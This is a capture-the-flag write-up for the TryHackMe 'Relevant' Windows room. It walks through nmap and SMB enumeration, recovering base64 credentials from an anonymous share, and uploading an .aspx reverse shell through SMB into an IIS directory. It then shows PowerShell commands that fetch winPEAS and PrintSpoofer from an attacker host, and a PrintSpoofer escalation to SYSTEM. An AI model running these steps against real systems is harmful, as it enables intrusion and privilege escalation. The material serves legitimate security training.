# [THM] Relevant — Writeup
---

https://tryhackme.com/room/relevant

**Difficulty:** Medium
**Tags:** Windows, SMB, IIS, ASPX, SeImpersonatePrivilege, PrintSpoofer, Black Box
**Solved:** May 2026

---

## Overview

Relevant is a Windows-based black box penetration test scenario room — minimal information provided, no hints on vulnerability locations, simulating a real engagement. The objective is to locate and exploit vulnerabilities to retrieve `user.txt` and `root.txt`.

What makes this room interesting is the attack path. It chains together an SMB misconfiguration with a web server that shares the same directory, turning anonymous file read/write access into Remote Code Execution.

---

## Enumeration

```bash
sudo nmap -p- ip -sV --min-rate 1000 -T4 -oA scan -Pn
```

```
PORT      STATE SERVICE       VERSION
80/tcp    open  http          Microsoft IIS httpd 10.0
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 - 2012 microsoft-ds
3389/tcp  open  ms-wbt-server Microsoft Terminal Services
49663/tcp open  http          Microsoft IIS httpd 10.0
49666/tcp open  msrpc         Microsoft Windows RPC
49667/tcp open  msrpc         Microsoft Windows RPC
```

Key observations:

| Port(s) | Service | Notes |
|---------|---------|-------|
| 80, 49663 | IIS 10.0 | Two separate web surfaces |
| 445, 139 | SMB | File sharing + legacy auth |
| 135, 49666, 49667 | RPC | Windows internals |
| 3389 | RDP | Remote access |

Two IIS instances are immediately interesting. Worth investigating whether they serve different content or share resources.

---

## SMB Enumeration

```bash
smbclient -N -L //ip
```

```
Sharename       Type      Comment
---------       ----      -------
ADMIN$          Disk      Remote Admin
C$              Disk      Default share
IPC$            IPC       Remote IPC
nt4wrksv        Disk
```

`-N` skips the password prompt - the server exposes shares without authentication. The non-default share `nt4wrksv` stands out immediately.

```bash
smbclient //ip/nt4wrksv -N
```

Inside we find `passwords.txt`, which contains base64-encoded credentials for two users: Bob and Bill.

```bash
echo "base64string" | base64 -d
```

---

## Credential Testing

With credentials in hand, the natural next step is WinRM:

```bash
evil-winrm -i ip -u Bob -p '!p@ss123'
```

Neither Bob nor Bill authenticate successfully over WinRM. Running `enum4linux-ng` with the recovered credentials also returns a false positive — the OS fingerprint comes back as:

```
Windows Server 2016 Standard Evaluation 14393
```

Dead end on this path. Time to pivot.

---

## Entry Point — SMB + IIS Directory Overlap

Here's where it gets interesting.

The web server running on port **49663** serves files from the **same directory as the `nt4wrksv` SMB share**. This means:

- We have anonymous **write access** via SMB
- The web server will **execute** files placed there
- IIS supports `.aspx` - we can upload and trigger a reverse shell

Upload a `.aspx` reverse shell via SMB:

```bash
smbclient //ip/nt4wrksv -N
put shell.aspx
```

Set up a listener:

```bash
nc -lvnp 4444
```

Navigate to `http://ip:49663/nt4wrksv/shell.aspx` - shell lands.

---

## Privilege Escalation — SeImpersonatePrivilege

Download enumeration and exploit binaries to the target:

```powershell
powershell -c "Invoke-WebRequest http://attacker_ip:port/winPEAS.bat -OutFile winPEAS.bat"
powershell -c "Invoke-WebRequest http://attacker_ip:port/PrintSpoofer64.exe -OutFile PrintSpoofer64.exe"
```

WinPEAS confirms `SeImpersonatePrivilege` is enabled — the same token abuse path as in Anthem. PrintSpoofer exploits this to impersonate `NT AUTHORITY\SYSTEM`.

```cmd
PrintSpoofer64.exe -i -c powershell
```

SYSTEM shell obtained. Collect `user.txt` and `root.txt`.

---

## Key Takeaways

- Always enumerate SMB - anonymous access to non-default shares is a common finding in real engagements
- When two services are running on different ports, check whether they share underlying resources. In this case the IIS + SMB directory overlap here and that is the entire attack chain
- `SeImpersonatePrivilege` on a service account should be treated as a direct path to SYSTEM
- Credentials found during enumeration aren't always useful on their first obvious target - pivot and try other services before discarding them

---

*Tags: Windows · TryHackMe · SMB · IIS · ASPX · Privilege Escalation · Black Box · CTF*